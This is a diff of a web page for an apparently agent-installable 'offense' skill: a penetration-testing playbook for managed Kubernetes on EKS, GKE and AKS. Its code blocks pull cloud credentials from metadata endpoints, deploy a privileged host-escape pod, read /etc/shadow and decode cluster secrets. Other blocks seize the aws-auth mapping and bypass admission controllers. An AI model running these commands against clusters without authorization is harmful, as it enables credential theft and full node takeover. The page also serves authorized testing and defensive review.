@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,12 +47,13 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Assess managed Kubernetes clusters on EKS, GKE, and AKS by exploiting the seams between cloud IAM and Kubernetes RBAC -- IRSA/OIDC trust abuse, Workload Identity Federation, pod-to-IMDS escalation, aws-auth ConfigMap takeover, node pool service account abuse, and AAD integration weaknesses. Use when pentesting a managed k8s cluster, reviewing RBAC in EKS/GKE/AKS, testing pod-to-cloud escalation, or assessing network policy enforcement across namespaces.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>Managed Kubernetes is a special target because it operates across two independent authorization planes: the cloud provider's IAM layer and Kubernetes' own RBAC layer. Each plane has its own identities, policies, and trust boundaries. The escalation paths live at the seams -- where a Kubernetes service account maps to a cloud IAM role, where a pod inherits a node's cloud credentials via the instance metadata service, or where a cluster-admin binding was granted through a cloud identity mapping that nobody audits. An attacker who understands only one plane misses the paths that cross into the other.</p>
+<div class="wrap slayout"><article><p>Managed Kubernetes is a special target because it operates across two independent authorization planes: the cloud provider's IAM layer and Kubernetes' own RBAC layer. Each plane has its own identities, policies, and trust boundaries. The escalation paths live at the seams -- where a Kubernetes service account maps to a cloud IAM role, where a pod inherits a node's cloud credentials via the instance metadata service, or where a cluster-admin binding was granted through a cloud identity mapping that nobody audits. An attacker who understands only one plane misses the paths that cross into the other.</p>
 <p>Only against systems you are authorized to test.</p>
-<h2>When to Use</h2>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>Assessing EKS, GKE, or AKS clusters during a penetration test</li>
 <li>Reviewing Kubernetes RBAC bindings and service account permissions</li>
@@ -50,7 +62,7 @@
 <li>Auditing cloud-to-cluster identity mappings (aws-auth, Workload Identity, AAD)</li>
 <li>Checking admission controller effectiveness and bypass potential</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Generic Docker container escapes or vanilla k8s without a cloud provider</strong> --</li>
 </ul>
@@ -71,8 +83,8 @@
 <li><strong>Writing detection rules for the attacks described here</strong> -- use</li>
 </ul>
 <p><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a></p>
-<h2>Cluster Discovery and Unauthenticated Access</h2>
-<pre><code># Discover clusters
+<h2 id="cluster-discovery-and-unauthenticated-access">Cluster Discovery and Unauthenticated Access</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Discover clusters
 aws eks list-clusters --region us-east-1        # EKS
 gcloud container clusters list                   # GKE
 az aks list                                      # AKS
@@ -85,10 +97,43 @@ curl -k https://&lt;api-server&gt;:443/version
 kubectl auth can-i --list --as=system:anonymous
 
 # Kubelet read-only port (10255) -- often disabled, worth checking
-curl http://&lt;node-ip&gt;:10255/pods</code></pre>
+curl http://&lt;node-ip&gt;:10255/pods">copy</button><pre><code># Discover clusters
+aws eks list-clusters --region us-east-1        # EKS
+gcloud container clusters list                   # GKE
+az aks list                                      # AKS
+
+# Unauthenticated API server check
+curl -k https://&lt;api-server&gt;:443/api/v1/namespaces
+curl -k https://&lt;api-server&gt;:443/version
+
+# Anonymous RBAC check -- system:anonymous may have bindings
+kubectl auth can-i --list --as=system:anonymous
+
+# Kubelet read-only port (10255) -- often disabled, worth checking
+curl http://&lt;node-ip&gt;:10255/pods</code></pre></div>
 <p>If the API server returns resources to unauthenticated requests, the cluster has anonymous auth or a misconfigured binding on <code>system:unauthenticated</code>.</p>
-<h2>RBAC Enumeration</h2>
-<pre><code># What can the current identity do?
+<h2 id="rbac-enumeration">RBAC Enumeration</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# What can the current identity do?
+kubectl auth can-i --list
+kubectl auth can-i --list --namespace kube-system
+
+# Check for cluster-admin bindings
+kubectl get clusterrolebindings -o json | \
+  jq &#x27;.items[] | select(.roleRef.name==&quot;cluster-admin&quot;) |
+  {name: .metadata.name, subjects: .subjects}&#x27;
+
+# Examine a service account token (JWT)
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+echo &quot;$TOKEN&quot; | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq .
+
+# Find overprivileged roles (wildcard on both resources and verbs)
+kubectl get clusterroles -o json | \
+  jq &#x27;.items[] | select(.rules[]? | .resources[]? == &quot;*&quot; and .verbs[]? == &quot;*&quot;) |
+  .metadata.name&#x27;
+
+# Who can create pods? Who can read secrets?
+kubectl auth can-i create pods --as=system:serviceaccount:NAMESPACE:SA_NAME
+kubectl auth can-i get secrets --all-namespaces --as=system:serviceaccount:NAMESPACE:SA_NAME">copy</button><pre><code># What can the current identity do?
 kubectl auth can-i --list
 kubectl auth can-i --list --namespace kube-system
 
@@ -108,11 +153,23 @@ kubectl get clusterroles -o json | \
 
 # Who can create pods? Who can read secrets?
 kubectl auth can-i create pods --as=system:serviceaccount:NAMESPACE:SA_NAME
-kubectl auth can-i get secrets --all-namespaces --as=system:serviceaccount:NAMESPACE:SA_NAME</code></pre>
+kubectl auth can-i get secrets --all-namespaces --as=system:serviceaccount:NAMESPACE:SA_NAME</code></pre></div>
 <p>Any non-system binding to cluster-admin is a finding. Cloud provider system components sometimes hold cluster-admin legitimately; distinguish those from human or workload bindings.</p>
-<h2>Pod-to-Cloud Escalation</h2>
+<h2 id="pod-to-cloud-escalation">Pod-to-Cloud Escalation</h2>
 <h3>EKS: IMDS from Pods</h3>
-<pre><code># IMDSv1 -- single unauthenticated GET from any pod (unless blocked)
+<div class="codeblk cx"><button class="copy" data-copy="# IMDSv1 -- single unauthenticated GET from any pod (unless blocked)
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;
+
+# IMDSv2 -- EKS sets default hop limit to 1 on Nitro instances, which blocks
+# IMDSv2 from pods (extra network hop decrements TTL to 0). If hop limit &gt;= 2:
+TOKEN=$(curl -s -X PUT &quot;http://169.254.169.254/latest/api/token&quot; \
+  -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;)
+curl -s -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;
+
+# Credentials returned are the EC2 node role, not the pod&#x27;s IRSA role.
+aws sts get-caller-identity  # confirm which role you hold">copy</button><pre><code># IMDSv1 -- single unauthenticated GET from any pod (unless blocked)
 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;
 
@@ -124,18 +181,33 @@ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
   http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;
 
 # Credentials returned are the EC2 node role, not the pod's IRSA role.
-aws sts get-caller-identity  # confirm which role you hold</code></pre>
+aws sts get-caller-identity  # confirm which role you hold</code></pre></div>
 <h3>GKE: Metadata from Pods</h3>
-<pre><code># GKE metadata server -- requires Metadata-Flavor header
+<div class="codeblk cx"><button class="copy" data-copy="# GKE metadata server -- requires Metadata-Flavor header
+curl -s -H &quot;Metadata-Flavor: Google&quot; \
+  &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&quot;
+curl -s -H &quot;Metadata-Flavor: Google&quot; \
+  &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email&quot;
+
+# With Workload Identity: metadata server returns a token scoped to the k8s
+# SA&#x27;s bound GCP SA. Without it: every pod gets the node pool&#x27;s GCP SA creds.">copy</button><pre><code># GKE metadata server -- requires Metadata-Flavor header
 curl -s -H "Metadata-Flavor: Google" \
   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
 curl -s -H "Metadata-Flavor: Google" \
   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
 
 # With Workload Identity: metadata server returns a token scoped to the k8s
-# SA's bound GCP SA. Without it: every pod gets the node pool's GCP SA creds.</code></pre>
+# SA's bound GCP SA. Without it: every pod gets the node pool's GCP SA creds.</code></pre></div>
 <h3>AKS: Pod Identity and IMDS</h3>
-<pre><code># Azure IMDS from a pod
+<div class="codeblk cx"><button class="copy" data-copy="# Azure IMDS from a pod
+curl -s -H &quot;Metadata: true&quot; \
+  &quot;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/&quot;
+
+# Pod identity (deprecated but still deployed): NMI daemonset assigns managed
+# identities. If misconfigured, pods request tokens for any identity on node.
+# Workload Identity (current): projected SA token exchanged for AAD token.
+env | grep -i azure
+cat $AZURE_FEDERATED_TOKEN_FILE 2&gt;/dev/null">copy</button><pre><code># Azure IMDS from a pod
 curl -s -H "Metadata: true" \
   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/"
 
@@ -143,9 +215,29 @@ curl -s -H "Metadata: true" \
 # identities. If misconfigured, pods request tokens for any identity on node.
 # Workload Identity (current): projected SA token exchanged for AAD token.
 env | grep -i azure
-cat $AZURE_FEDERATED_TOKEN_FILE 2&gt;/dev/null</code></pre>
-<h2>Node Compromise Paths</h2>
-<pre><code># Privileged pod -- full host access
+cat $AZURE_FEDERATED_TOKEN_FILE 2&gt;/dev/null</code></pre></div>
+<h2 id="node-compromise-paths">Node Compromise Paths</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Privileged pod -- full host access
+apiVersion: v1
+kind: Pod
+metadata:
+  name: priv-pod
+spec:
+  hostNetwork: true
+  hostPID: true
+  containers:
+  - name: shell
+    image: alpine
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: hostfs
+      mountPath: /host
+    command: [&quot;nsenter&quot;, &quot;--target&quot;, &quot;1&quot;, &quot;--mount&quot;, &quot;--uts&quot;, &quot;--ipc&quot;, &quot;--net&quot;, &quot;--pid&quot;, &quot;--&quot;, &quot;/bin/bash&quot;]
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /">copy</button><pre><code># Privileged pod -- full host access
 apiVersion: v1
 kind: Pod
 metadata:
@@ -165,8 +257,23 @@ spec:
   volumes:
   - name: hostfs
     hostPath:
-      path: /</code></pre>
-<pre><code># If you can create pods, deploy the above and you own the node.
+      path: /</code></pre></div>
+<div class="codeblk cx"><button class="copy" data-copy="# If you can create pods, deploy the above and you own the node.
+# From the node, access IMDS, kubelet credentials, and other pods.
+
+# hostPath mount without full privilege -- still dangerous
+# Mount /etc, /var/lib/kubelet, or /var/run/docker.sock
+
+# hostPID -- see host processes, ptrace, /proc/1/root
+ls /proc/1/root/etc/shadow
+
+# hostNetwork -- access services bound to the node&#x27;s loopback
+# including the kubelet API on 10250
+curl -k https://127.0.0.1:10250/pods
+
+# Check what the kubelet certificate can do
+curl -k --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
+  https://&lt;api-server&gt;/api/v1/nodes">copy</button><pre><code># If you can create pods, deploy the above and you own the node.
 # From the node, access IMDS, kubelet credentials, and other pods.
 
 # hostPath mount without full privilege -- still dangerous
@@ -181,9 +288,27 @@ curl -k https://127.0.0.1:10250/pods
 
 # Check what the kubelet certificate can do
 curl -k --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
-  https://&lt;api-server&gt;/api/v1/nodes</code></pre>
-<h2>Secrets Enumeration</h2>
-<pre><code># Decode secrets in current namespace
+  https://&lt;api-server&gt;/api/v1/nodes</code></pre></div>
+<h2 id="secrets-enumeration">Secrets Enumeration</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Decode secrets in current namespace
+kubectl get secrets -o json | jq -r &#x27;.items[].data | to_entries[] |
+  &quot;\(.key): \(.value | @base64d)&quot;&#x27;
+
+# All namespaces (requires cluster-wide read)
+kubectl get secrets --all-namespaces -o json | jq -r &#x27;.items[] |
+  &quot;\(.metadata.namespace)/\(.metadata.name): \(.data | keys)&quot;&#x27;
+
+# Which pods mount secrets?
+kubectl get pods --all-namespaces -o json | jq -r &#x27;.items[] |
+  select(.spec.volumes[]?.secret) |
+  &quot;\(.metadata.namespace)/\(.metadata.name): \([.spec.volumes[] |
+  select(.secret) | .secret.secretName])&quot;&#x27;
+
+# etcd -- managed providers do not expose it directly. If you find an
+# endpoint (self-managed or misconfigured):
+ETCDCTL_API=3 etcdctl --endpoints=https://&lt;etcd&gt;:2379 \
+  --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca \
+  get /registry/secrets --prefix --keys-only">copy</button><pre><code># Decode secrets in current namespace
 kubectl get secrets -o json | jq -r '.items[].data | to_entries[] |
   "\(.key): \(.value | @base64d)"'
 
@@ -201,10 +326,36 @@ kubectl get pods --all-namespaces -o json | jq -r '.items[] |
 # endpoint (self-managed or misconfigured):
 ETCDCTL_API=3 etcdctl --endpoints=https://&lt;etcd&gt;:2379 \
   --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca \
-  get /registry/secrets --prefix --keys-only</code></pre>
-<h2>Cloud-Specific Attack Paths</h2>
+  get /registry/secrets --prefix --keys-only</code></pre></div>
+<h2 id="cloud-specific-attack-paths">Cloud-Specific Attack Paths</h2>
 <h3>EKS</h3>
-<pre><code># aws-auth ConfigMap -- maps IAM roles/users to k8s RBAC
+<div class="codeblk cx"><button class="copy" data-copy="# aws-auth ConfigMap -- maps IAM roles/users to k8s RBAC
+kubectl get configmap aws-auth -n kube-system -o yaml
+# If you can edit this ConfigMap, you can grant any IAM role cluster-admin.
+# This is the single most important escalation path in EKS.
+kubectl edit configmap aws-auth -n kube-system
+
+# IRSA (IAM Roles for Service Accounts) -- OIDC trust abuse
+# Each EKS cluster has an OIDC provider. Service accounts annotated with
+# eks.amazonaws.com/role-arn get temporary credentials for that IAM role.
+# The IAM role&#x27;s trust policy should restrict by namespace and SA name.
+# If the trust policy uses a wildcard or missing condition:
+aws iam get-role --role-name ROLE_NAME | jq &#x27;.Role.AssumeRolePolicyDocument&#x27;
+# Look for:
+#   &quot;StringEquals&quot;: { &quot;&lt;oidc&gt;:sub&quot;: &quot;system:serviceaccount:*:*&quot; }  &lt;-- BAD
+#   &quot;StringLike&quot; with a broad pattern                                &lt;-- BAD
+# A properly scoped trust policy restricts to one namespace:SA pair.
+
+# Create a pod with the target SA to assume the role
+kubectl run steal --image=amazon/aws-cli \
+  --overrides=&#x27;{&quot;spec&quot;:{&quot;serviceAccountName&quot;:&quot;TARGET_SA&quot;}}&#x27; \
+  -- sleep 3600
+kubectl exec -it steal -- aws sts get-caller-identity
+
+# EKS access entries (newer alternative to aws-auth)
+aws eks list-access-entries --cluster-name CLUSTER
+aws eks describe-access-entry --cluster-name CLUSTER \
+  --principal-arn arn:aws:iam::ACCOUNT:role/ROLE">copy</button><pre><code># aws-auth ConfigMap -- maps IAM roles/users to k8s RBAC
 kubectl get configmap aws-auth -n kube-system -o yaml
 # If you can edit this ConfigMap, you can grant any IAM role cluster-admin.
 # This is the single most important escalation path in EKS.
@@ -230,9 +381,30 @@ kubectl exec -it steal -- aws sts get-caller-identity
 # EKS access entries (newer alternative to aws-auth)
 aws eks list-access-entries --cluster-name CLUSTER
 aws eks describe-access-entry --cluster-name CLUSTER \
-  --principal-arn arn:aws:iam::ACCOUNT:role/ROLE</code></pre>
+  --principal-arn arn:aws:iam::ACCOUNT:role/ROLE</code></pre></div>
 <h3>GKE</h3>
-<pre><code># Node pool service account -- if not using Workload Identity, every pod
+<div class="codeblk cx"><button class="copy" data-copy="# Node pool service account -- if not using Workload Identity, every pod
+# on the node inherits the node pool&#x27;s GCP service account. The default
+# compute SA often has Editor on the project.
+gcloud container node-pools describe POOL --cluster CLUSTER --zone ZONE \
+  --format=&quot;value(config.serviceAccount)&quot;
+
+# Check the SA&#x27;s IAM bindings
+gcloud projects get-iam-policy PROJECT --flatten=&quot;bindings[].members&quot; \
+  --filter=&quot;bindings.members:serviceAccount:SA_EMAIL&quot; \
+  --format=&quot;value(bindings.role)&quot;
+
+# Workload Identity Federation -- k8s SA to GCP SA mapping
+gcloud iam service-accounts get-iam-policy SA_EMAIL \
+  --format=json | jq &#x27;.bindings[] |
+  select(.role==&quot;roles/iam.workloadIdentityUser&quot;)&#x27;
+
+# If the GCP SA has iam.serviceAccountTokenCreator on other SAs,
+# you can impersonate them:
+gcloud auth print-access-token --impersonate-service-account=TARGET_SA_EMAIL
+
+# GKE metadata concealment (legacy) -- hides some metadata paths but
+# does not prevent token retrieval. Workload Identity is the real fix.">copy</button><pre><code># Node pool service account -- if not using Workload Identity, every pod
 # on the node inherits the node pool's GCP service account. The default
 # compute SA often has Editor on the project.
 gcloud container node-pools describe POOL --cluster CLUSTER --zone ZONE \
@@ -253,9 +425,25 @@ gcloud iam service-accounts get-iam-policy SA_EMAIL \
 gcloud auth print-access-token --impersonate-service-account=TARGET_SA_EMAIL
 
 # GKE metadata concealment (legacy) -- hides some metadata paths but
-# does not prevent token retrieval. Workload Identity is the real fix.</code></pre>
+# does not prevent token retrieval. Workload Identity is the real fix.</code></pre></div>
 <h3>AKS</h3>
-<pre><code># AAD integration -- AKS can use Azure AD for authentication
+<div class="codeblk cx"><button class="copy" data-copy="# AAD integration -- AKS can use Azure AD for authentication
+az aks show --resource-group RG --name CLUSTER \
+  --query &quot;aadProfile&quot; -o json
+
+# Kubelet identity -- the managed identity assigned to the VMSS nodes
+az aks show --resource-group RG --name CLUSTER \
+  --query &quot;identityProfile.kubeletidentity&quot; -o json
+# If this identity has broad Azure RBAC, any pod reaching IMDS gets those
+# permissions (unless using Workload Identity to scope access).
+
+# AKS Workload Identity -- check for federated credential bindings
+az identity federated-credential list \
+  --identity-name IDENTITY --resource-group RG
+
+# AKS managed AAD -- check cluster admin group membership
+az aks show --resource-group RG --name CLUSTER \
+  --query &quot;aadProfile.adminGroupObjectIDs&quot;">copy</button><pre><code># AAD integration -- AKS can use Azure AD for authentication
 az aks show --resource-group RG --name CLUSTER \
   --query "aadProfile" -o json
 
@@ -271,9 +459,27 @@ az identity federated-credential list \
 
 # AKS managed AAD -- check cluster admin group membership
 az aks show --resource-group RG --name CLUSTER \
-  --query "aadProfile.adminGroupObjectIDs"</code></pre>
-<h2>Network Policy Assessment</h2>
-<pre><code># Are any NetworkPolicies defined?
+  --query "aadProfile.adminGroupObjectIDs"</code></pre></div>
+<h2 id="network-policy-assessment">Network Policy Assessment</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Are any NetworkPolicies defined?
+kubectl get networkpolicies --all-namespaces
+
+# If none exist, all pods can talk to all other pods across all namespaces.
+# This is the default in every managed k8s offering.
+
+# Check which CNI is installed (determines enforcement)
+kubectl get pods -n kube-system | grep -E &#x27;calico|cilium|weave|canal|azure-cni&#x27;
+# EKS: VPC CNI by default (no network policy enforcement without Calico/Cilium addon)
+# GKE: Dataplane V2 (Cilium-based, enforces policies when enabled)
+# AKS: Azure CNI or kubenet (network policy requires Calico or Azure NPM addon)
+
+# Test cross-namespace connectivity
+kubectl run test --image=busybox --rm -it --restart=Never -- \
+  wget -qO- --timeout=3 http://SERVICE.OTHER_NAMESPACE.svc.cluster.local
+
+# Test pod-to-IMDS (should be blocked by network policy in hardened clusters)
+kubectl run test --image=busybox --rm -it --restart=Never -- \
+  wget -qO- --timeout=3 http://169.254.169.254/">copy</button><pre><code># Are any NetworkPolicies defined?
 kubectl get networkpolicies --all-namespaces
 
 # If none exist, all pods can talk to all other pods across all namespaces.
@@ -291,10 +497,35 @@ kubectl run test --image=busybox --rm -it --restart=Never -- \
 
 # Test pod-to-IMDS (should be blocked by network policy in hardened clusters)
 kubectl run test --image=busybox --rm -it --restart=Never -- \
-  wget -qO- --timeout=3 http://169.254.169.254/</code></pre>
+  wget -qO- --timeout=3 http://169.254.169.254/</code></pre></div>
 <p>Without a CNI that supports network policies, defining NetworkPolicy resources has no effect. The policies exist in the API but are not enforced. This is a common misunderstanding.</p>
-<h2>Admission Controller Bypass</h2>
-<pre><code># List admission webhooks
+<h2 id="admission-controller-bypass">Admission Controller Bypass</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# List admission webhooks
+kubectl get validatingwebhookconfigurations
+kubectl get mutatingwebhookconfigurations
+
+# Check if Pod Security Admission (PSA) is configured
+kubectl get namespaces -o json | jq &#x27;.items[] |
+  {name: .metadata.name, labels: .metadata.labels |
+  with_entries(select(.key | startswith(&quot;pod-security&quot;)))}&#x27;
+
+# Common bypasses:
+# 1. Create resources in a namespace without PSA labels
+# 2. Use ephemeral containers (kubectl debug) -- some controllers miss these
+kubectl debug node/NODE_NAME -it --image=alpine
+
+# 3. Modify existing deployments instead of creating new pods
+# 4. Use CronJobs or Jobs -- some webhooks only match Pod creates
+# 5. Target the webhook&#x27;s failurePolicy: if set to Ignore, disabling the
+#    webhook service (or its DNS) allows all requests through
+kubectl get validatingwebhookconfigurations -o json | \
+  jq &#x27;.items[] | {name: .metadata.name,
+  failurePolicy: .webhooks[].failurePolicy}&#x27;
+
+# 6. Check namespaceSelector -- webhooks often exclude kube-system
+kubectl get validatingwebhookconfigurations -o json | \
+  jq &#x27;.items[].webhooks[] | {name: .name,
+  namespaceSelector: .namespaceSelector}&#x27;">copy</button><pre><code># List admission webhooks
 kubectl get validatingwebhookconfigurations
 kubectl get mutatingwebhookconfigurations
 
@@ -319,8 +550,8 @@ kubectl get validatingwebhookconfigurations -o json | \
 # 6. Check namespaceSelector -- webhooks often exclude kube-system
 kubectl get validatingwebhookconfigurations -o json | \
   jq '.items[].webhooks[] | {name: .name,
-  namespaceSelector: .namespaceSelector}'</code></pre>
-<h2>Defensive Review Checklist</h2>
+  namespaceSelector: .namespaceSelector}'</code></pre></div>
+<h2 id="defensive-review-checklist">Defensive Review Checklist</h2>
 <ul>
 <li>RBAC: no non-system cluster-admin bindings; automountServiceAccountToken false where unused</li>
 <li>Pod security: PSA labels enforce restricted/baseline per namespace</li>
@@ -334,7 +565,7 @@ kubectl get validatingwebhookconfigurations -o json | \
 <li>GKE: Workload Identity enabled; default compute SA not on node pools</li>
 <li>AKS: AAD integration enforced; kubelet identity minimally scoped</li>
 </ul>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"We use a managed service, so the control plane is secure."</em> The control</li>
 </ul>
@@ -363,7 +594,7 @@ kubectl get validatingwebhookconfigurations -o json | \
 <li><em>"We'll review RBAC later; the cluster is in dev."</em> Dev clusters often</li>
 </ul>
 <p>share IAM roles, VPC peering, and image registries with production. Escalation paths from dev to prod through shared cloud identity are common.</p>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Execution</strong> (TA0002)</p>
 <ul>
@@ -374,7 +605,7 @@ kubectl get validatingwebhookconfigurations -o json | \
 <li><a href="https://attack.mitre.org/techniques/T1552/005/">T1552.005</a> Cloud Instance Metadata API — see also <a class="xref" href="exploiting-ssrf.html"><code>exploiting-ssrf</code></a>, <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a></li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a class="xref" href="exploiting-containers.html"><code>exploiting-containers</code></a> -- generic container escapes, Docker socket abuse,</li>
 </ul>
@@ -390,5 +621,8 @@ kubectl get validatingwebhookconfigurations -o json | \
 <ul>
 <li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> -- building detection rules for the attack</li>
 </ul>
-<p>patterns described here</p></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+<p>patterns described here</p></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#cluster-discovery-and-unauthenticated-access">Cluster Discovery and Unauthenticated Access</a><a href="#rbac-enumeration">RBAC Enumeration</a><a href="#pod-to-cloud-escalation">Pod-to-Cloud Escalation</a><a href="#node-compromise-paths">Node Compromise Paths</a><a href="#secrets-enumeration">Secrets Enumeration</a><a href="#cloud-specific-attack-paths">Cloud-Specific Attack Paths</a><a href="#network-policy-assessment">Network Policy Assessment</a><a href="#admission-controller-bypass">Admission Controller Bypass</a><a href="#defensive-review-checklist">Defensive Review Checklist</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
